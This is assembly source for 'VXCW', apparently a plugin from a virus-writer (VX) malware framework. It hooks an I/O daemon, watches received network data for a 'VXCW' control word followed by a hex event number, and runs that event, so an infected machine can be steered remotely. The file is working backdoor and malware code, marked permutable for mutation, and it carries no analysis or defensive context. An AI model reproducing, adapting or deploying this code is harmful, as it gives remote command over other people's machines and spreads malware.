   ; VXCW (vx controlword)
   ; ~~~~
   ; - remote control using controlwords

   include                 INCLUDE\consts.inc
   include                 INCLUDE\seh.inc
   include                 iodaemon.inc

   include                 plugin.inc
                           PLUGIN_START    VXCW, CODE32, PERMUTABLE

   handleevent:            hookevent EV_IODAEMON_GOT_VXCW, main
                           stc
                           retn

   ; input: ESI=VXCW<something>, within recv() data stream

   main:                   pusha

   ;                       mov     eax, [esi]
   ;                       neg     eax
   ;                       cmp     eax, -'WCXV'
   ;                       jne     __exit

                           mov     eax, [esi+4]
                           not     eax
                           cmp     ax, not 'VE'    ; EVxxxx
                           je      __ev

   ;                       cmp     eax, not 'KCUF'
   ;                       je      __fuck

   __exit:                 popa
                           stc
                           retn

   ; action: exec specified EVENT
   ; format: VXCWEV1234

   __ev:                   mov     eax, [esi+6]
                           call    hex2bin
                           jc      __exit
                           and     eax, 0000FFFFh
                           or      eax, EV_VXCW_BASE shl 8
                           pusha
   ;                       mov     eax, <event-number>
                           seh_init
                           call    ebp
                           seh_done
                           popa
                           jmp     __exit

   ; input:  EAX = '09af'
   ; output: CF=0: EAX=09AFh
   ;         CF=1: error

   hex2bin:                pusha
                           xor     edx, edx
                           push    4
                           pop     ecx
   __cycle:                or      al, 20h
                           sub     al, '0'
                           cmp     al, 10
                           jb      __ok
                           add     al, '0'-'a'+10
                           cmp     al, 16
                           jae     __exit_bad
   __ok:                   rol     dx, 4
                           or      dl, al
                           shr     eax, 8
                           loop    __cycle
                           mov     [esp].popa_eax, edx
                           clc
                           jmp     __exit
   __exit_bad:             stc
   __exit:                 popa
                           retn

                           PLUGIN_END
